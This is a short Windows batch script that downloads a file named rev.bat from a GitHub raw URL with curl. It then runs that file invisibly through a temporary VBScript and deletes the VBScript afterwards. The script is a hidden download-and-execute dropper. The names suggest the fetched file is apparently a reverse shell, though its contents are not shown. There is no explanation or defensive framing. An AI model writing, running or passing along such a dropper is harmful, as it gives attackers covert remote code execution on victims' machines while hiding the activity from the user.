@echo off
set "VBScript=%temp%\hidden.vbs"
echo Set WshShell = CreateObject("WScript.Shell") > "%VBScript%"
echo WshShell.Run "cmd /c rev.bat", 0, False >> "%VBScript%"
curl https://raw.githubusercontent.com/0x2034/shell/main/rev.bat -o rev.bat
start /min wscript.exe "%VBScript%"
del "%VBScript%"
